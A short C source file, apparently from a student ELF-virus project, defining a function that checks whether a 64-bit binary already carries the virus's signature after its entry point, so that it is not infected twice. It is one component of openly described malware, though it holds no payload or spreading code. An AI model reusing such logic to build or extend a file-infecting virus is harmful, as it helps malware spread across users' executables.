/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   can_infect.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/15 15:48:52 by ichkamo           #+#    #+#             */
/*   Updated: 2019/12/20 22:05:54 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "errors.h"
#include "utils.h"

/*
** if current binary is already our client, don't infect again ! <3
*/

bool		can_infect(const struct entry *original_entry, \
			struct safe_ptr ref)
{
	const Elf64_Off	sh_offset        = (original_entry->safe_shdr->sh_offset);
	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
	const size_t	signature_offset = entry_offset + CALL_INSTR_SIZE + sizeof(struct virus_header);
	char	 	*signature       = safe(signature_offset, SIGNATURE_LEN);

	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
		return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	return true;
}
